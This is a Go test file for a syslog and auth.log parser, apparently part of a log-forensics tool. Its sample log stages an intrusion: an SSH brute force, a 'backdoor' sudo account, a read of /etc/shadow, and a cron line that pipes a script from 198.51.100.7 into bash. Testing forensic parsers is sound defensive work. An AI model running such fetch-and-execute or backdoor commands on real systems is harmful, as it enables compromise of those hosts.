package syslog

import (
	"context"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/ciruzz00/astro/internal/logs"
)

func parse(t *testing.T, in string, opts logs.Options) ([]*logs.Event, logs.Stats) {
	t.Helper()
	var out []*logs.Event
	st, err := New().Parse(context.Background(), strings.NewReader(in), opts, func(e *logs.Event) error {
		out = append(out, e)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out, st
}

var mtime = time.Date(2026, 10, 12, 8, 0, 0, 0, time.UTC)

const authLog = `Oct 11 21:00:01 web01 sshd[812]: Invalid user admin from 203.0.113.9 port 50122
Oct 11 21:00:02 web01 sshd[812]: Failed password for invalid user admin from 203.0.113.9 port 50122 ssh2
Oct 11 21:00:03 web01 sshd[813]: Failed password for root from 203.0.113.9 port 50130 ssh2
Oct 11 21:00:04 web01 sshd[813]: message repeated 5 times: [ Failed password for root from 203.0.113.9 port 50130 ssh2]
Oct 11 21:00:09 web01 sshd[814]: Accepted password for root from 203.0.113.9 port 50140 ssh2
Oct 11 21:00:09 web01 sshd[814]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Oct 11 21:00:09 web01 systemd-logind[401]: New session 7 of user root.
Oct 11 21:01:00 web01 useradd[900]: new group: name=backdoor, GID=1002
Oct 11 21:01:00 web01 useradd[900]: new user: name=backdoor, UID=1002, GID=1002, home=/home/backdoor, shell=/bin/bash, from=/dev/pts/0
Oct 11 21:01:05 web01 usermod[905]: add 'backdoor' to group 'sudo'
Oct 11 21:01:05 web01 usermod[905]: add 'backdoor' to shadow group 'sudo'
Oct 11 21:01:10 web01 passwd[910]: pam_unix(passwd:chauthtok): password changed for backdoor
Oct 11 21:02:00 web01 sudo:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Oct 11 21:02:05 web01 sudo:      bob : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash
Oct 11 21:02:06 web01 sudo:      eve : user NOT in sudoers ; TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c id; whoami
Oct 11 21:02:10 web01 su[920]: (to root) alice on pts/1
Oct 11 21:02:11 web01 su[921]: FAILED SU (to root) bob on pts/2
Oct 11 21:02:12 web01 sshd[900]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.7  user=root
Oct 11 21:03:00 web01 CRON[930]: (root) CMD (curl -s http://198.51.100.7/x.sh | bash)
Oct 11 21:03:01 web01 sshd-session[940]: Disconnected from user root 203.0.113.9 port 50140
Oct 11 21:03:02 web01 systemd[1]: Started evil.service - Evil Service.
Oct 11 21:03:03 web01 kernel: [ 12.345] usb 1-1: new device
garbage that is not syslog
`

func TestAuthLog(t *testing.T) {
	evs, st := parse(t, authLog, logs.Options{Source: "auth.log", ModTime: mtime})
	if st.Errors != 1 || st.Events != len(evs) || len(evs) != 22 {
		t.Fatalf("stats = %+v, %d events", st, len(evs))
	}
	type want struct {
		kind, user, ip, cmd string
		sev                 logs.Severity
		field, value        string
	}
	wants := []want{
		{KindSSHInvalidUser, "admin", "203.0.113.9", "", logs.Low, "port", "50122"},
		{KindSSHFailed, "admin", "203.0.113.9", "", logs.Low, "invalid_user", "true"},
		{KindSSHFailed, "root", "203.0.113.9", "", logs.Low, "method", "password"},
		{KindSSHFailed, "root", "203.0.113.9", "", logs.Low, "repeated", "5"},
		{KindSSHAccepted, "root", "203.0.113.9", "", logs.Info, "port", "50140"},
		{KindSessionOpened, "root", "", "", logs.Info, "service", "sshd"},
		{KindLogindSession, "root", "", "", logs.Info, "session", "7"},
		{KindGroupCreated, "", "", "", logs.Low, "group", "backdoor"},
		{KindUserCreated, "backdoor", "", "", logs.Medium, "shell", "/bin/bash"},
		{KindGroupMember, "backdoor", "", "", logs.Medium, "group", "sudo"},
		{KindGroupMember, "backdoor", "", "", logs.Medium, "group", "sudo"},
		{KindPasswordChanged, "backdoor", "", "", logs.Low, "service", "passwd"},
		{KindSudo, "alice", "", "/usr/bin/cat /etc/shadow", logs.Info, "target_user", "root"},
		{KindSudoFailed, "bob", "", "/bin/bash", logs.Low, "tty", "pts/2"},
		{KindSudoDenied, "eve", "", "/bin/sh -c id; whoami", logs.Medium, "pwd", "/tmp"},
		{KindSu, "alice", "", "", logs.Info, "target_user", "root"},
		{KindSuFailed, "bob", "", "", logs.Low, "tty", "pts/2"},
		{KindAuthFailure, "root", "198.51.100.7", "", logs.Low, "service", "sshd"},
		{KindCron, "root", "", "curl -s http://198.51.100.7/x.sh | bash", logs.Info, "pid", "930"},
		{KindSSHDisconnect, "root", "203.0.113.9", "", logs.Info, "port", "50140"},
		{KindServiceStarted, "", "", "", logs.Info, "unit", "evil.service - Evil Service"},
		{KindGeneric, "", "", "", logs.Info, "", ""},
	}
	for i, w := range wants {
		e := evs[i]
		if e.Kind != w.kind || e.User != w.user || e.SrcIP != w.ip || e.CommandLine != w.cmd || e.Severity != w.sev ||
			(w.field != "" && e.Fields[w.field] != w.value) {
			t.Errorf("event %d (%s):\n got  %s user=%q ip=%q cmd=%q sev=%s fields=%v\n want %+v", i, e.Raw, e.Kind, e.User, e.SrcIP, e.CommandLine, e.Severity, e.Fields, w)
		}
		if e.Host != "web01" || e.Source != "auth.log" || !e.YearGuessed || e.Ref.Record == "" || e.Message == "" {
			t.Errorf("event %d common fields = %+v", i, e)
		}
	}
	first := evs[0]
	if !first.Time.Equal(time.Date(2026, 10, 11, 21, 0, 1, 0, time.UTC)) || first.Ref.Record != "line 1" || first.Provider != "sshd" {
		t.Errorf("first = %v %s %s", first.Time, first.Ref.Record, first.Provider)
	}
	if evs[4].Message != "SSH login accepted for root from 203.0.113.9 (password)" {
		t.Errorf("message = %q", evs[4].Message)
	}
}

func TestYearAndZone(t *testing.T) {
	in := "Dec 31 23:59:58 h a: x\nJan  1 00:00:02 h a: y\n"
	jan := time.Date(2027, 1, 1, 9, 0, 0, 0, time.UTC)
	evs, _ := parse(t, in, logs.Options{ModTime: jan})
	if evs[0].Time.Year() != 2026 || evs[1].Time.Year() != 2027 {
		t.Errorf("rollover: %v, %v", evs[0].Time, evs[1].Time)
	}
	rome, err := time.LoadLocation("Europe/Rome")
	if err != nil {
		t.Skip("no tzdata")
	}
	evs, _ = parse(t, "Oct 11 23:00:00 h a: x\n", logs.Options{Year: 2025, Location: rome})
	if !evs[0].Time.Equal(time.Date(2025, 10, 11, 21, 0, 0, 0, time.UTC)) || evs[0].YearGuessed {
		t.Errorf("forced year and zone: %v guessed=%v", evs[0].Time, evs[0].YearGuessed)
	}
	if _, st := parse(t, "Feb 30 10:00:00 h a: x\n", logs.Options{Year: 2026}); st.Errors != 1 {
		t.Errorf("impossible date accepted")
	}
}

func TestOtherFormats(t *testing.T) {
	in := "2026-10-11T23:00:00.123456+02:00 web01 sshd[5]: Accepted publickey for deploy from 2001:db8::5 port 2222 ssh2: ED25519 SHA256:abc\n" +
		"2026-10-11T21:00:01+0000 web01 CRON[6]: (www-data) CMD (php /var/www/cron.php)\n" +
		`<38>1 2026-10-11T21:00:02.5Z web02 sshd 77 ID47 [exampleSDID@32473 iut="3" eventSource="App\]x"] Failed password for root from 192.0.2.4 port 22 ssh2` + "\n" +
		"<13>1 2026-10-11T21:00:03Z - - - - - \uFEFFhello\n" +
		"<13>1 - web02 app - - - no time\n"
	evs, st := parse(t, in, logs.Options{})
	if st.Errors != 1 || len(evs) != 4 {
		t.Fatalf("stats = %+v, events %d", st, len(evs))
	}
	if e := evs[0]; e.Kind != KindSSHAccepted || e.SrcIP != "2001:db8::5" || e.User != "deploy" || e.YearGuessed ||
		!e.Time.Equal(time.Date(2026, 10, 11, 21, 0, 0, 123456000, time.UTC)) || e.Fields["method"] != "publickey" {
		t.Errorf("ISO = %+v", e)
	}
	if e := evs[1]; e.Kind != KindCron || e.User != "www-data" || !e.Time.Equal(time.Date(2026, 10, 11, 21, 0, 1, 0, time.UTC)) {
		t.Errorf("ISO without colon = %+v", e)
	}
	if e := evs[2]; e.Kind != KindSSHFailed || e.Host != "web02" || e.SrcIP != "192.0.2.4" || e.Fields["msgid"] != "ID47" ||
		e.Fields["facility"] != "4" || e.Fields["priority"] != "6" || !strings.Contains(e.Fields["structured_data"], `App\]x`) || e.Fields["pid"] != "77" {
		t.Errorf("RFC 5424 = %+v", e)
	}
	if e := evs[3]; e.Message != "hello" || e.Host != "" || e.Provider != "" {
		t.Errorf("RFC 5424 nil values = %+v", e)
	}
}

func TestMoreAuthMessages(t *testing.T) {
	in := "Oct 11 22:00:00 web01 pkexec[50]: alice: Executing command [USER=root] [TTY=/dev/pts/4] [CWD=/home/alice] [COMMAND=/usr/bin/id -u]\n" +
		"Oct 11 22:00:01 web01 pkexec[51]: mallory: Error executing command as another user: Not authorized [USER=root] [TTY=unknown] [CWD=/tmp] [COMMAND=/bin/sh]\n" +
		"Oct 11 22:00:02 web01 passwd[52]: password for 'deploy' changed by 'root'\n" +
		"Oct 11 22:00:03 web01 sshd[53]: Server listening on 0.0.0.0 port 2222.\n" +
		"Oct 11 22:00:04 web01 systemd-logind[54]: Removed session 12.\n" +
		"Oct 11 22:00:05 web01 login[55]: ROOT LOGIN  on '/dev/pts/7' from '203.0.113.9'\n" +
		"Oct 11 22:00:06 web01 login[56]: LOGIN ON tty2 BY alice\n" +
		"Oct 11 22:00:07 web01 gdm-password]: gkr-pam: unlocked login keyring\n"
	evs, _ := parse(t, in, logs.Options{Year: 2026})
	if e := evs[5]; e.Kind != KindRootLogin || e.User != "root" || e.Fields["tty"] != "/dev/pts/7" || e.SrcIP != "203.0.113.9" {
		t.Errorf("root login = %+v", e)
	}
	if e := evs[6]; e.Kind != KindTerminalLogin || e.User != "alice" || e.Fields["tty"] != "tty2" {
		t.Errorf("terminal login = %+v", e)
	}
	if e := evs[7]; e.Process != "gdm-password" || e.Message != "gkr-pam: unlocked login keyring" {
		t.Errorf("GDM tag = %q / %q", e.Process, e.Message)
	}
	if e := evs[0]; e.Kind != KindPkexec || e.User != "alice" || e.CommandLine != "/usr/bin/id -u" || e.Fields["target_user"] != "root" || e.Fields["cwd"] != "/home/alice" {
		t.Errorf("pkexec = %+v", e)
	}
	if e := evs[1]; e.Kind != KindPkexecDenied || e.Severity != logs.Medium || e.Fields["note"] != "Not authorized" || e.CommandLine != "/bin/sh" {
		t.Errorf("pkexec denied = %+v", e)
	}
	if e := evs[2]; e.Kind != KindPasswordChanged || e.User != "deploy" || e.Fields["by"] != "root" {
		t.Errorf("passwd = %+v", e)
	}
	if e := evs[3]; e.Kind != KindSSHListening || e.Fields["port"] != "2222" || e.Fields["address"] != "0.0.0.0" {
		t.Errorf("listening = %+v", e)
	}
	if e := evs[4]; e.Kind != KindLogindRemoved || e.Fields["session"] != "12" {
		t.Errorf("logind = %+v", e)
	}
}

func TestNULPadding(t *testing.T) {
	in := "2026-10-11T21:00:00+00:00 web01 sshd[1]: Accepted password for root from 203.0.113.9 port 1 ssh2\n" +
		strings.Repeat("\x00", 811) + "2026-10-11T23:07:41+02:00 web01 systemd-logind[2]: New session 3 of user root.\n" +
		"2026-10-11T21:08:00+00:00 web01 sshd[1]: x\n" + strings.Repeat("\x00", 10)
	evs, st := parse(t, in, logs.Options{})
	if st.Errors != 0 || len(evs) != 5 {
		t.Fatalf("stats = %+v, events = %d", st, len(evs))
	}
	gap := evs[1]
	if gap.Kind != logs.KindNULPadding || gap.Severity != logs.Medium || gap.Fields["nul_bytes"] != "811" ||
		!gap.Time.Equal(time.Date(2026, 10, 11, 21, 7, 41, 0, time.UTC)) || gap.Ref.Record != "line 2" || gap.Host != "web01" {
		t.Errorf("gap = %+v", gap)
	}
	if evs[2].Kind != KindLogindSession || strings.ContainsRune(evs[2].Raw, 0) {
		t.Errorf("line after the gap = %+v", evs[2])
	}
	if tail := evs[4]; tail.Kind != logs.KindNULPadding || tail.Fields["nul_bytes"] != "10" || !tail.Time.Equal(evs[3].Time) {
		t.Errorf("trailing gap = %+v", tail)
	}
}

func TestHostnamesAreNotIPs(t *testing.T) {
	evs, _ := parse(t, "Oct 11 21:00:00 h sshd[1]: Failed password for root from scanner.example.com port 22 ssh2\n", logs.Options{Year: 2026})
	if evs[0].SrcIP != "" || evs[0].Fields["rhost"] != "scanner.example.com" {
		t.Errorf("event = %+v", evs[0])
	}
}

func TestLimitStopsParser(t *testing.T) {
	n := 0
	_, err := New().Parse(context.Background(), strings.NewReader(authLog), logs.Options{Year: 2026}, func(*logs.Event) error {
		n++
		if n == 3 {
			return logs.ErrLimit
		}
		return nil
	})
	if err != logs.ErrLimit || n != 3 {
		t.Errorf("err = %v after %d events", err, n)
	}
}

func FuzzParse(f *testing.F) {
	for _, l := range strings.Split(authLog, "\n") {
		f.Add(l)
	}
	f.Add(`<38>1 2026-10-11T21:00:02.5Z web02 sshd 77 ID47 [a b="\]"][c] msg`)
	f.Add("2026-10-11T23:00:00.1+02:00 h p[1]: m")
	f.Fuzz(func(t *testing.T, in string) {
		_, err := New().Parse(context.Background(), strings.NewReader(in), logs.Options{ModTime: mtime}, func(e *logs.Event) error {
			if e.Time.IsZero() || e.Time.Location() != time.UTC || e.Kind == "" || !utf8.ValidString(e.Raw) {
				t.Fatalf("bad event %+v", e)
			}
			return nil
		})
		if err != nil {
			t.Fatal(err)
		}
	})
}
